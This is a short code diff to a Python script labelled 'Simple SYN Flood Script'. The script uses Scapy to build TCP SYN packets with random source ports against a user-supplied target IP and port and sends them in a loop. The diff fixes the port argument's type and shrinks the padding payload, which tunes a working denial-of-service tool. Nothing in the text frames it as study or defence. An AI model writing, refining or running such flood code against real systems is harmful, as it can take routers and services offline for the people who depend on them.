@@ -3,7 +3,7 @@ import argparse
 
 parser = argparse.ArgumentParser(description="Simple SYN Flood Script")
 parser.add_argument("target_ip", help="Target IP address (e.g router's IP)")
-parser.add_argument("-p", "--port", help="Destination port (the port of the target's machine service, \
+parser.add_argument("-p", "--port", type=int, help="Destination port (the port of the target's machine service, \
 e.g 80 for HTTP, 22 for SSH and so on).")
 # parse arguments from the command line
 args = parser.parse_args()
@@ -20,7 +20,7 @@ ip = IP(dst=target_ip)
 tcp = TCP(sport=RandShort(), dport=target_port, flags="S")
 # add some flooding data (1KB in this case, don't increase it too much, 
 # otherwise, it won't work.)
-raw = Raw(b"X"*1024)
+raw = Raw(b"X"*2)
 # stack up the layers
 p = ip / tcp / raw
 # send the constructed packet in a loop until CTRL+C is detected 
